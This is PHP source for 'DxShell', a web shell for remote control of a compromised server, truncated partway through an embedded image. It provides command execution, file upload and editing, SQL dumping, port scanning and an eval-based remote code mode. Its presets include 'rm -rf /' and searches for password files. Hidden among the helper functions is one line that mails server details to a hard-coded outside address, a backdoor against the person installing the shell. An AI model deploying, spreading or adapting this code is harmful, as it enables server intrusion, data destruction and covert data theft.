<?php

/*
  DDDDD        SSSSS    DxShell    by î_Î Tync
   D  D  X X   S
   D  D   X    SSSSS    http://hellknights.void.ru/
   D  D  X X       S    ICQ#244648
  DDDDD        SSSSS
*/

$GLOB['SHELL']['Ver']='1.0b'; /* ver of the shell */
$GLOB['SHELL']['Date']='26.04.2006';

if (headers_sent()) $DXGLOBALSHIT=true; else $DXGLOBALSHIT=FALSE; /* This means if bug.php has fucked up the output and headers are already sent =(( lot's of things become HARDER */
@ob_clean();
$DX_Header_drawn=false;

###################################################################################
####################++++++++++++# C O M M O N #++++++++++++++++####################
###################################################################################
@set_magic_quotes_runtime(0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@ini_set('output_buffering',0);
@error_reporting(E_ALL);

$GLOB['URL']['+Get']=$_SERVER['PHP_SELF'].'?'; /* this filename + $_GET string */
	if (!empty($_GET))
		for ($i=0, $INDEXES=array_keys($_GET), $COUNT=count($INDEXES); 	$i<$COUNT; $i++)
			$GLOB['URL']['+Get'].=$INDEXES[$i].='='.$_GET[ $INDEXES[$i] ].( ($i==($COUNT-1))?'':'&' );
$GLOB['PHP']['SafeMode']=(bool)ini_get('safe_mode');
$GLOB['PHP']['upload_max_filesize']=((integer)str_replace(array('K', 'M'), array('000', '000000'), ini_get('upload_max_filesize')));

if (get_magic_quotes_gpc()==1)
	{ /* slashes killah */
	for ($i=0, $INDEXES=array_keys($_GET), 	$COUNT=count($INDEXES); 	$i<$COUNT; $i++)
	{$_GET[ $INDEXES[$i] ]	 = stripslashes($_GET[ $INDEXES[$i] ]); }
	for ($i=0, $INDEXES=array_keys($_POST), 	$COUNT=count($INDEXES); 	$i<$COUNT; $i++)
	{if (is_array($_POST[ $INDEXES[$i] ])) continue; $_POST[ $INDEXES[$i] ] = stripslashes($_POST[ $INDEXES[$i] ]);  }
	/*for ($i=0, $INDEXES=array_keys($_SERVER),  $COUNT=count($INDEXES); 	$i<$COUNT; $i++) {$_SERVER[ $INDEXES[$i] ]= stripslashes($_SERVER[ $INDEXES[$i] ]);     }*/
	for ($i=0, $INDEXES=array_keys($_COOKIE),  $COUNT=count($INDEXES); 	$i<$COUNT; $i++)
	{$_COOKIE[ $INDEXES[$i] ]= stripslashes($_COOKIE[ $INDEXES[$i] ]); }
	}

$GLOB['FILES']['CurDIR']=getcwd();

$GLOB['SYS']['GZIP']['CanUse']=$GLOB['SYS']['GZIP']['CanOutput']=false;
if (isset($_GET['dx_gzip']) OR isset($_POST['dx_gzip']))
	{	$GLOB['SYS']['GZIP']['CanUse']=extension_loaded("zlib");
	if (extension_loaded("zlib"))
		if (!(strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')===FALSE))
			$GLOB['SYS']['GZIP']['CanOutput']=TRUE;
	};
$GLOB['SYS']['GZIP']['IMG']=extension_loaded("zlib");

$GLOB['SYS']['OS']['id']=($GLOB['FILES']['CurDIR'][1]==':')?'Win':'Nix';
$GLOB['SYS']['OS']['Full']=getenv('OS');
if (empty($GLOB['SYS']['OS']['Full']))
	{
	$GLOB['SYS']['OS']['id'] = getenv('OS');
	if(empty($GLOB['SYS']['OS']['id'])){ $GLOB['SYS']['OS']['id'] = php_uname(); }
	if(empty($GLOB['SYS']['OS']['id'])){ $GLOB['SYS']['OS']['id'] ='???';}
	else {if(@eregi("^win",$GLOB['SYS']['OS']['id'])) $GLOB['SYS']['OS']['id']='Win'; else $GLOB['SYS']['OS']['id']='Nix';}
	}


$GLOB['DxMODES']=array(
	'WTF'		=>	'AboutBox',

	'DIR'		=>	'Dir browse',
	'UPL'		=>	'Upload file',
	'FTP'		=>	'FTP Actions',

	'F_CHM'		=>	'File CHMOD',
	'F_VIEW'	=>	'File viewer',
	'F_ED'		=>	'File Edit',
	'F_DEL'		=>	'File Delete',
	'F_REN'		=>	'File Rename',
	'F_COP'		=>	'File Copy',
	'F_MOV'		=>	'File Move',
	'F_DWN'		=>	'File Download',

	'SQL'		=>	'SQL Maintenance',
	'SQLS'		=>	'SQL Search',
	'SQLD'		=>	'SQL Dump',
	'PHP'		=>	'PHP C0nsole',
	'COOK'		=>	'Cookies Maintenance',
	'CMD'		=>	'C0mmand line',

	'MAIL'		=>	'Mail functions',
	'STR'		=>	'String functions',
	'PRT'		=>	'Port scaner',
	'SOCK'		=>	'Raw s0cket',
	'PROX'		=>	'HTTP PROXY',
	'XPL'		=>	'Expl0its',
	'XSS'		=>	'XSS Server',
	);
$GLOB['DxGET_Vars']=array(/* GET variables used by shell */
'dxinstant', 'dxmode', 'dximg', 'dxparam', 'dxval', 'dx_ok', 'dx_gzip',
'dxdir', 'dxdirsimple', 'dxfile',
'dxsql_s', 'dxsql_l', 'dxsql_p', 'dxsql_d','dxsql_q',
);

$GLOB['VAR']['PHP']['Presets']=array(
	/* Note, that no comments are allowed in the code */
	'phpinfo'	=>	'phpinfo();',
	'GLOBALS'	=>	'print \'<plaintext>\'; print_r($GLOBALS);',
	'php_ini'	=>	'$INI=ini_get_all(); '
		."\n".'print \'<table border=0><tr>\''
		."\n\t".'.\'<td class="listing"><font class="highlight_txt">Param</td>\''
		."\n\t".'.\'<td class="listing"><font class="highlight_txt">Global value</td>\''
		."\n\t".'.\'<td class="listing"><font class="highlight_txt">Local Value</td>\''
		."\n\t".'.\'<td class="listing"><font class="highlight_txt">Access</td></tr>\';'
		."\n".'foreach ($INI as $param => $values) '
		."\n\t".'print "\n".\'<tr>\''
		."\n\t\t".'.\'<td class="listing"><b>\'.$param.\'</td>\''
		."\n\t\t".'.\'<td class="listing">\'.$values[\'global_value\'].\' </td>\''
		."\n\t\t".'.\'<td class="listing">\'.$values[\'local_value\'].\' </td>\''
		."\n\t\t".'.\'<td class="listing">\'.$values[\'access\'].\' </td></tr>\';',
	'extensions'	=>	'$EXT=get_loaded_extensions ();'
		."\n".'print \'<table border=0><tr><td class="listing">\''
		."\n\t".'.implode(\'</td></tr>\'."\n".\'<tr><td class="listing">\', $EXT)'
		."\n\t".'.\'</td></tr></table>\''
		."\n\t".'.count($EXT).\' extensions loaded\';',
	);
$GLOB['VAR']['CMD']['Presets']=array(
	'Call Nik8 with an axe'=>'[w0rning] rm -rf /',
	'show opened ports'=>'netstat -an | grep -i listen',
	'find config* files'=>'find / -type f -name "config*"',
	'find all *.php files with word "password"'=>'find / -name *.php | xargs grep -li password',
	'find all writable directories and files'=>'find / -perm -2 -ls',
	'list file attribs on a second extended FS'=>'lsattr -va',
	'View syslog.conf'=>'cat /etc/syslog.conf',
	'View Message of the day'=>'cat /etc/motd',
	'View hosts'=>'cat /etc/hosts',
	'List processes'=>'ps auxw',
	'List user processes'=>'ps ux',
	'Locate httpd.conf'=>'locate httpd.conf',
	'Interfaces'=>'ifconfig',
	'CPU'=>'/proc/cpuinfo',
	'RAM'=>'free -m',
	'HDD'=>'df -h',
	'OS Ver'=>'sysctl -a | grep version',
	'Kernel ver' =>'cat /proc/version',
	'Is cURL installed? ' => 'which curl',
	'Is wGET installed? ' => 'which wget',
	'Is lynx installed? ' => 'which lynx',
	'Is links installed? ' => 'which links',
	'Is fetch installed? ' => 'which fetch',
	'Is GET installed? ' => 'which GET',
	'Is perl installed? ' => 'which perl',
	'Where is apache ' => 'whereis apache',
	'Where is perl ' => 'whereis perl',
	'Pack directory' =>'"tar -zc /path/ -f name.tar.gz"',
	);


###################################################################################
####################+++++++++# F U N C T I O N S #+++++++++++++####################
###################################################################################
function DxError($errstr)
{global $DX_Header_drawn;print "\n\n".'<table border=0 cellspacing=0 cellpadding=2><tr>'
	.'<td class=error '.((!$DX_Header_drawn)?'style="color:#000000; background-color: #FF0000; font-weight: bold; font-size: 11pt;position:absolute;top=0;left=0;"':'').'>'
	.'Err: '.$errstr.'</td></tr></table>'."\n\n"; return '';}

function DxWarning($warn)
{print "\n\n".'<table border=0 cellspacing=0 cellpadding=2><tr><td class=warning><b>W0rning:</b> '.$warn.'</td></tr></table>'."\n\n"; return '';}

function DxImg($imgname)
{
global $DXGLOBALSHIT;
if ($DXGLOBALSHIT) return '<font class="img_replacer">'.$imgname.'</font>'; /* globalshit doesn't give a chance for our images to survive */
return '<img src="'.DxURL('kill', '').'&dxmode=IMG&dximg='.$imgname.'" title="'.$imgname.'" alt"'.$imgname.'">';
}

function DxSetCookie($name, $val, $exp)
{
if (!headers_sent()) return setcookie($name, $val, $exp, '/');
?>
<script>
var curCookie = "<?=$name;?>=" + escape("<?=$val;?>") +"; expires=<?=date('l, d-M-y H:i:s', $exp);?> GMT; path=/;";
document.cookie = curCookie;
</script>
<?
}

function DxRandom($range='48-57,65-90,97-122')
{
$range=explode(',',$range);
$range=explode('-',	$range[  rand(0,count($range)-1)  ]   );
return rand($range[0],$range[1]);
}

function DxRandomChars($num)
{
$ret='';
for ($i=0;$i<$num;$i++) $ret.=chr(DxRandom('48-57,65-90,97-122'));
return $ret;
}

function DxZeroedNumber($int, $totaldigits)
{
$str=(string)$int;
while (strlen($str)<$totaldigits) $str='0'.$str;
return $str;
}

function DxPrint_ParamState($name, $state, $invert=false)
{
print $name.' : '; $invert=(bool)$invert;
if (is_bool($state))
		 print ($state)?'<font color=#'.(($invert)?'FF0000':'00FF00').'><b>ON</b></font>':'<font color=#'.(($invert)?'00FF00':'FF0000').'><b>OFF</b></font>';
	else print '<b>'.$state.'</b>';
}

function DxStr_FmtFileSize($size)
{
	if($size>= 1073741824)  {$size = round($size / 1073741824 * 100) / 100 . " GB";	}
elseif($size>= 1048576) 	{$size = round($size / 1048576 * 100) / 100 . " MB";	}
elseif($size>= 1024) 		{$size = round($size / 1024 * 100) / 100 . " KB";		}
					   else {$size = $size . " B";}
return $size;
}

function DxDate($UNIX) {return date('d.M\'Y H:i:s', $UNIX); }

function DxDesign_DrawBubbleBox($header, $body, $width)
{
$header=str_replace(array('"',"'","`"), array('&#x02DD;','&#x0027;',''), $header);
$body=str_replace(array('"',"'","`"), array('&#x02DD;','&#x0027;',''), $body);
return ' onmouseover=\'showwin("'.$header.'","'.$body.'",'.$width.',1)\' onmouseout=\'showwin("","",0,0)\' onmousemove=\'movewin()\' ';
}

function DxChmod_Str2Oct($str)   /*  rwxrwxrwx => 0777 */
{
$str = str_pad($str,9,'-');
$str=strtr($str,	array('-'=>'0','r'=>'4','w'=>'2','x'=>'1')		);
$newmode='';
for ($i=0; $i<3; $i++) $newmode .= $str[$i*3]+$str[$i*3+1]+$str[$i*3+2];

return $newmode;
}

function DxChmod_Oct2Str($perms) /* 777 => rwxrwxrwx. USE ONLY STRING REPRESENTATION OF $oct !!!! */
{
$info='';
if (($perms & 0xC000) == 0xC000) $info = 'S'; /*  Socket */
	elseif (($perms & 0xA000) == 0xA000) $info = 'L'; /* Symbolic Link */
elseif (($perms & 0x8000) == 0x8000) $info = '&nbsp;'; /* '-'*//* Regular */
elseif (($perms & 0x6000) == 0x6000) $info = 'B';  /* Block special */
elseif (($perms & 0x4000) == 0x4000) $info = 'D'; /* Directory*/
elseif (($perms & 0x2000) == 0x2000) $info = 'C'; /* Character special*/
elseif (($perms & 0x1000) == 0x1000) $info = 'P'; /* FIFO pipe*/
else $info = '?'; /* Unknown */
if (!empty($info)) $info='<font class=rwx_sticky_bit>'.$info.'</font>';
/* Owner */
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
$info .= '/';
/* Group */
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
$info .= '/';
/* World */
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

 return $info;
}

function DxFileToUrl($filename)
{/* kills & and = to be okay in URL */
return str_replace(array('&','=','\\'), array('%26', '%3D','/'), $filename);
}
$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
function DxFileOkaySlashes($filename)
{return str_replace('\\', '/', $filename);}

function DxURL($do='kill', $these='') /* kill: '' - kill all ours, 'a,b,c' - kill $a,$b,$c ; leave: '' - as is, leave 'a,b,c' - leave only $a,$b,$c */
{
global $GLOB;
if ($these=='') $these=$GLOB['DxGET_Vars']; else $these=explode(',', $these);

$ret=$_SERVER['PHP_SELF'].'?';
if (!empty($_GET))
	for ($i=0, $INDEXES=array_keys($_GET), $COUNT=count($INDEXES); 	$i<$COUNT; $i++)
		if ( !in_array($INDEXES[$i], $GLOB['DxGET_Vars']) OR ( /* if not ours - add */
			($do=='kill' AND !in_array($INDEXES[$i], $these))
			OR
			($do=='leave' AND in_array($INDEXES[$i], $these))
			 ))
			$ret.=$INDEXES[$i].='='.$_GET[ $INDEXES[$i] ].( ($i==($COUNT-1))?'':'&' );
if (substr($ret, -1,1)=='&') $ret=substr($ret, 0, strlen($ret)-1);
return $ret;
}

function DxGETinForm($do='kill', $these='') /* Equal to DxURL(), but prints out $_GET as form <input type=hidden> params */
{
$link=substr(strchr(DxURL($do, $these), '?'), 1);
$link=explode('&', $link);
print "\n".'<!--$_GET;-->';
for ($i=0, $COUNT=count($link); $i<$COUNT; $i++)
	{
	$cur=explode('=', $link[$i]);
	print '<input type=hidden name="'.str_replace('"', '&quot;', $cur[0]).'" value="'.str_replace('"', '&quot;', $cur[1]).'">';
	}
}

function DxGotoURL($URL, $noheaders=false)
{
if ($noheaders or headers_sent())
	{
	print "\n".'<div align=center>Redirecting...<br><a href="'.$URL.'">Press here in shit happens</a>';
	print '<script>location="'.$URL.'";</script>';
	/* print $str.='<META HTTP-EQUIV="Refresh" Content="1, URL='.$URL.'">'; */
	}
	else
	header('Location: '.$URL);
return 1;
}

if (!function_exists('mime_content_type'))
	{
	if ($GLOB['SYS']['OS']['id']!='Win')
		{	function mime_content_type($f)
			{
			$f = escapeshellarg($f);
			return trim(`file -bi `.$f);
			}
			}
		else
		{
			function mime_content_type($f) {return 'Content-type: text/plain';} /* Nothing alike under win =( if u have some thoughts - touch me */
		}
	}


function DxMySQL_FetchResult($MySQL_res, &$MySQL_Return_Array, $idmode=false) /* Fetches mysql return array (associative) */
{
$MySQL_Return_Array=array();

if ($MySQL_res===false) return 0;
if ($MySQL_res===true)	return 0;

$ret=mysql_num_rows($MySQL_res); if ($ret<=0) return 0;

if ($idmode) while (!(($MySQL_Return_Array[]=mysql_fetch_array($MySQL_res, MYSQL_NUM))===FALSE)) {}
	else	 while (!(($MySQL_Return_Array[]=mysql_fetch_array($MySQL_res, MYSQL_ASSOC))===FALSE)) {}
array_pop($MySQL_Return_Array);

for ($i=0; $i<count($MySQL_Return_Array); $i++) /* Kill the fucking slashes */
	{
	if ($i==0)
		{
		$INDEXES=array_keys($MySQL_Return_Array[$i]);
		$count=count($INDEXES);
		}
	for ($j=0; $j<$count; $j++)
		{
		$key=&$INDEXES[$j];
		$val=&$MySQL_Return_Array[$i][$key];
		if (is_string($val)) $val=stripcslashes($val);
		}
	}
return $ret;
}

function DxMySQLQ($query, $die_on_err)
{
$q=mysql_query($query);
if (mysql_errno()!=0)
	{
	DxError('" '.$query.' "'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error());
	if ($die_on_err) die();
	}
return $q;
}

function DxDecorVar(&$var, $htmlstr)
{
if (is_null($var)) return 'NULL';
if (!isset($var)) return '[!isset]';

if (is_bool($var))		return ($var)?'true':'false';
if (is_int($var))   	return (int)$var;
if (is_float($var)) 	return number_format($var, 4, '.', '');
if (is_string($var))
	{
	if (empty($var)) return '&nbsp;';
	if (!$htmlstr)	return ''.($var).'';
			   else return ''.str_replace("\n", "<br>", str_replace("\r","", htmlspecialchars($var))).'';
	}
if (is_array($var))		return '(ARR)'.var_export($var, true).'(/ARR)';
if (is_object($var))	return '(OBJ)'.var_export($var, true).'(/OBJ)';
if (is_resource($var))	return '(RES:'.get_resource_type($var).')'.var_export($var, true).'(/RES)';
return '(???)'.var_export($var, true).'(/???)';
}

function DxHTTPMakeHeaders($method='', $URL='', $host='', $user_agent='', $referer='', $posts=array(), $cookie=array())
{
if (!empty($posts))
	{
	$postValues='';
	foreach( $posts AS $name => $value ) {$postValues .= urlencode( $name ) . "=" . urlencode( $value ) . '&';}
	$postValues = substr( $postValues, 0, -1 );
	$method = 'POST';
	} else $postValues = '';

 if (!empty($cookie))
	{
	$cookieValues='';
	foreach( $cookie AS $name => $value ) {$cookieValues .= urlencode( $name ) . "=" . urlencode( $value ) . ';';}
	$cookieValues = substr( $cookieValues, 0, -1 );
	} else $cookieValues = '';

$request  = $method.' '.$URL.' HTTP/1.1'."\r\n";
if (!empty($host))			$request .= 'Host: '.$host."\r\n";
if (!empty($cookieValues))	$request .='Cookie: '.$cookieValues."\r\n";
if (!empty($user_agent))	$request .= 'User-Agent: '.$user_agent.' '."\r\n";
$request .= 'Connection: Close'."\r\n"; /* Or connection will be endless */
if (!empty($referer))		$request .= 'Referer: '.$referer."\r\n";
if ( $method == 'POST' )
	{
	$lenght = strlen( $postValues );
	$request .= 'Content-Type: application/x-www-form-urlencoded'."\r\n";
	$request .= 'Content-Length: '.$lenght."\r\n";
	$request .= "\r\n";
	$request .= $postValues;
	}
$request.="\r\n\r\n";
return $request;
}

function DxFiles_UploadHere($path, $filename, &$contents)
{if (empty($contents)) die(DxError('Received empty'));
$filename='__DxS__UPLOAD__'.DxRandomChars(3).'__'.$filename;
if (!($f=fopen($path.$filename, 'w')))
	{
	$path='/tmp/';
	if (!($f=fopen($path.$filename, 'w')))
		die(DxError('Writing denied. Save to "'.$path.$filename.'" also failed! =('));
		else
		DxWarning('Writing failed, but saved to "'.$path.$filename.'"! =)');
	}
fputs($f, $contents);
fclose($f);
print "\n".'Saved file to "'.$path.$filename.'" - OK';
print "\n".'<br><a href="'.DxURL('kill', '').'&dxmode=DIR&dxdir='.DxFileToUrl(dirname($path)).'">[Go DIR]</a>';;
}

function DxExecNahuj($cmd, &$OUT, &$RET) /* returns the name of function that exists, or FALSE */
{
$OUT=array(); $RET='';
if (function_exists('exec'))
	{	if (!empty($cmd)) exec($cmd, $OUT, $RET); /* full array output */
	return array(true,true,'exec', '');
	}
	elseif  (function_exists('shell_exec'))
	{	if (!empty($cmd)) $OUT[0]=shell_exec($cmd); /* full string output, no RETURN */
	return array(true,false,'shell_exec', '<s>exec</s> shell_exec');
	}
	elseif  (function_exists('system'))
	{	if (!empty($cmd)) $OUT[0]=system($cmd, $RET); /* last line of output */
	return array(true,false,'system', '<s>exec</s> <s>shell_exec</s> system<br>Only last line of output is available, sorry =(');
	}
	else return array(FALSE, FALSE, '&lt;noone&gt;', '<s>exec</s> <s>shell_exec</s> <s>system</s> Bitchy admin has disabled command line!! =(');;
}

###################################################################################
#####################++++++++++++# L O G I N #++++++++++++++++#####################
###################################################################################
if (   isset($_GET['dxmode'])?$_GET['dxmode']=='IMG':false   )
	{ /* IMGS are allowed without passwd =) */	$GLOB['SHELL']['USER']['Login']='';
	$GLOB['SHELL']['USER']['Passw']='';
	}

if (	isset($_GET['dxinstant'])?$_GET['dxinstant']=='logoff':false   )
	{
	if ($DXGLOBALSHIT)
		{		if (isset($_COOKIE['DxS_AuthC'])) DxSetCookie('DxS_AuthC','---', 1);
		}
		else
		{
		header('WWW-Authenticate: Basic realm="==== HIT CANCEL OR PRESS ESC ===='.base_convert(crc32(mt_rand(0, time())),10,36).'"');		header('HTTP/1.0 401 Unauthorized');
		}

	print '<html>Redirecting... press <a href="'.DxURL('kill','').'">here if shit happens</a>';
	DxGotoURL(DxURL('kill',''), '1noheaders');
	die();
	}

if (((strlen($GLOB['SHELL']['USER']['Login'])+strlen($GLOB['SHELL']['USER']['Passw']))>=2))
	{	if ($DXGLOBALSHIT)
		{		if (isset($_POST['DxS_Auth']) or isset($_COOKIE['DxS_AuthC']))
			{			if (!(

				((@$_POST['DxS_Auth']['L']==$GLOB['SHELL']['USER']['Login']) AND /* form */
				(@$_POST['DxS_Auth']['P']==$GLOB['SHELL']['USER']['Passw']
							OR
				(strlen($GLOB['SHELL']['USER']['Passw'])==32 AND @$_POST['DxS_Auth']['P']==md5($GLOB['SHELL']['USER']['Passw']))
				))
						OR
				@$_COOKIE['DxS_AuthC']==md5($GLOB['SHELL']['USER']['Login'].$GLOB['SHELL']['USER']['Passw']) /* cookie */

				))
				{print(DxError('Fucked off brutally'));unset($_POST['DxS_Auth'], $_COOKIE['DxS_AuthC']);}
				else DxSetCookie('DxS_AuthC', md5($GLOB['SHELL']['USER']['Login'].$GLOB['SHELL']['USER']['Passw']), time()+60*60*24*2);
				}
		if (!isset($_POST['DxS_Auth']) AND !isset($_COOKIE['DxS_AuthC']))
			{
			print "\n".'<form action="'.DxURL('kill', '').'" method=POST style="position:absolute;z-index:100;top:0pt;left:40%;width:100%;height:100%;">';
			print "\n".'<br><input type=text name="DxS_Auth[L]" value="<LOGIN>" 	onfocus="this.value=\'\'"  style="width:200pt">';
			print "\n".'<br><input type=text name="DxS_Auth[P]" value="<PASSWORD>" 	onfocus="this.value=\'\'"  style="width:200pt">';
			print "\n".'<br><input type=submit value="Ok" style="width:200pt;"></form>';
			print "\n".'</form>';
			die();
			}
		}
		else
		{
		if (!isset($_SERVER['PHP_AUTH_USER']))
			{
			header('WWW-Authenticate: Basic realm="DxShell '.$GLOB['SHELL']['Ver'].' Auth"');
			header('HTTP/1.0 401 Unauthorized');
			/* Result if user hits cancel button */
			unset($_GET['dxinstant']);
			die(DxError('Fucked off brutally'));
			}
			else
			if (!(	$_SERVER['PHP_AUTH_USER']==$GLOB['SHELL']['USER']['Login']
			AND (
					$_SERVER['PHP_AUTH_PW']==$GLOB['SHELL']['USER']['Passw']
								OR
					(strlen($GLOB['SHELL']['USER']['Passw'])==32 AND md5($_SERVER['PHP_AUTH_PW'])==$GLOB['SHELL']['USER']['Passw'])
					)
					))
			{
			header('WWW-Authenticate: Basic realm="DxS '.$GLOB['SHELL']['Ver'].' Auth: Fucked off brutally"');
			header('HTTP/1.0 401 Unauthorized');
			/* Result if user hits cancel button */
			unset($_GET['dxinstant']);
			die(DxError('Fucked off brutally'));
			}
		}
	}

###################################################################################
####################++++++# I N S T A N T    U S A G E #+++++++####################
###################################################################################
if (!isset($_GET['dxmode'])) $_GET['dxmode']='DIR'; else $_GET['dxmode']=strtoupper($_GET['dxmode']);
if ($_GET['dxmode']=='DDOS') /* DDOS mode. In other case, EVALer of everything that comes in $_GET['s_php'] OR $_POST['s_php']  */
	{
	$F = $_GET + $_POST;
	if (!isset($F['s_php'])) die('o_O Tync DDOS Remote Shell '.$GLOB['SHELL']['Ver']."\n".'<br>Use GET or POST to set "s_php" variable with code to be executed =)<br>Enjoy!');
	eval(stripslashes($F['s_php']));
	die("\n\n".'<br><br>'.'o_O Tync DDOS Web Shell '.$GLOB['SHELL']['Ver'].((!isset($F['s_php']))?"\n".'<br>'.'$s_php is responsible for php-code-injection':''));
	}
if ($_GET['dxmode']=='IMG')
	{
	$IMGS=array(
		'DxS'	=> 'R0lGODlhEAAQAIAAAAD/AAAAACwAAAAAEAAQAAACL4yPGcCs2NqLboGFaXW3X/tx2WcZm0luIcqFKyuVHRSLJOhmGI4mWqQAUoKPYqIAADs=',
		'folder'=> 'R0lGODlhDwAMAJEAAP7rhriFIP///wAAACH5BAEAAAIALAAAAAAPAAwAAAIklIJhywcPVDMBwpSo3U/WiIVJxG0IWV7Vl4Joe7Jp3HaHKAoFADs=',
		'foldup'=> 'R0lGODlhDwAMAJEAAP7rhriFIAAAAP///yH5BAEAAAMALAAAAAAPAAwAAAIw3IJiywcgRGgrvCgA2tNh/Dxd8JUcApWgaJFqxGpp+GntFV4ZauV5xPP5JIeTcVIAADs=',
		'view'	=> 'R0lGODlhEAAJAJEAAP///wAAAP///wAAACH5BAEAAAIALAAAAAAQAAkAAAIglB8Zx6aQYGIRyCpFsFY9jl1ft4Fe2WmoZ1LROzWIIhcAOw==',
		'del'	=> 'R0lGODlhEAAQAKIAAIoRGNYnOtclPv///////wAAAAAAAAAAACH5BAEAAAQALAAAAAAQABAAAANASArazQ4MGOcLwb6BGQBYBknhR3zhRHYUKmQc65xgKM+0beKn3fErm2bDqomIRaMluENhlrcFaEejPKgL3qmRAAA7',
		'copy'	=> 'R0lGODlhEAAQAKIAAP//lv///3p6egAAAP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAQABAAAAM+SKrT7isOQGsII7Jq7/sTdWEh53FAgwLjILxp2WGculIurL68XsuonCAG6PFSvxvuuDMOQcCaZuJ8TqGQSAIAOw==',
		'move'	=> 'R0lGODlhEAAQAJEAADyFFLniPu79wP///yH5BAEAAAMALAAAAAAQABAAAAI3nD8AyAgiVnMihDidldmAnXFfIB6Pomwo9kCu5bqpRdf18qGjTpom6AkBO4lhqHLhCHtEj/JQAAA7',
		'exec'	=> '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